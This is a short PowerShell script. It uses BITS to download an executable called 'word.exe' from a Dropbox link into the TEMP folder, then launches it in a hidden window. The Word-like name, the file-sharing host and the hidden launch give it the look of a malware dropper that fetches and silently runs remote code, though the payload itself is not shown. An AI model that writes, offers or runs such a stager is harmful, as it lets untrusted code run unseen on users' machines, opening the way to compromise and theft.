$DownloadUrl = "https://www.dropbox.com/scl/fi/nmw82t48k2i0y43vzl3uw/word.exe?rlkey=kua8330w3d0f8vvimhevqcxoc&st=zekyrblp&dl=1"
$ExeName     = "word.exe"
$Arguments   = ""
$DestPath    = Join-Path $env:TEMP $ExeName

Write-Host "Downloading $ExeName via BITS..."

try {
    # Using BITS transfer for a more robust background download
    Start-BitsTransfer -Source $DownloadUrl -Destination $DestPath
    Write-Host "Downloaded to: $DestPath"
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

Write-Host "Running $ExeName silently..."

$StartArgs = @{
    FilePath    = $DestPath
    WindowStyle = "Hidden"
    Wait        = $true
}

if ($Arguments -ne "") {
    $StartArgs.ArgumentList = $Arguments
}

try {
    $Proc = Start-Process @StartArgs -PassThru
    Write-Host "Process exited with code: $($Proc.ExitCode)"
} catch {
    Write-Error "Failed to run executable: $_"
    exit 1
}
